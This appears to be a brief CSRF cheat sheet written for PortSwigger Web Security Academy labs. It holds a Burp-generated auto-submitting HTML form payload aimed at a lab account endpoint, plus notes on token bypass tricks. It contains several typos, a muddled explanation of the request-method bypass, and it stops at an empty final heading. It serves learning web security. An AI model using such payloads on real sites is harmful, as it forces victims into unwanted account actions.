# CSRF Cheat Sheet

## Burp Suite CSRF PoF 

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a8c00430370cdb281bc2110000d005a.web-security-academy.net/my-account" method="POST">
      <input type="hidden" name="id" value="wiener" />
      <input type="hidden" name="csrf" value="ASLKCEVLASKSfaksW" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Check if there's any csrf defense mechanism
We can check this by omitting the **`<input type="hidden" name="csrf" value="ASLKCEVLASKSfaksW" />`** part from the above payload. 

### CSRF where token validation depends on request method
Most requests are POST request, which validate the csrf token. However, when chaning these requests to other methods, the token is no longer valid. We can test this by changing the request method.

### CSRF where token validation depends on token bieng present
The token is only validated when it is present. When it is not ( by omitting the value field or the whole thinig like no defense mechanism scenario), there is no CSRF tokekn validation.

### CSRF token is not tied to the user session
Check if we can use CSRF token of 1 account to exploit another account. 
1. Log in account A and acquire its token
2. Log in account B and deliver the payload, modify the token with account A's token

### CSRF token is tied to a non-session cookie
